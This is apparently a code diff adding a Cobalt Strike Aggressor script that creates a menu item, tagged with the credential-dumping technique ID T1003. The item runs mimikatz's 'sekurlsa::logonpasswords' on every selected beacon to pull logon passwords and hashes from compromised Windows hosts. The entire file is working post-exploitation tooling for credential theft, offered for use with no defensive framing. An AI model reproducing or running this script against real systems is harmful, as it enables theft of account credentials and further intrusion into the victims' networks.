@@ -1,0 +1,14 @@
+item "Mimikatz Logon Passwords  - T1003"{
+			local('$bid');
+				foreach $bid ($1){
+					logonpasswords($bid);
+				}
+			}
+			
+			
+			
+sub logonpasswords{
+
+bmimikatz($1, "sekurlsa::logonpasswords");
+
+}			
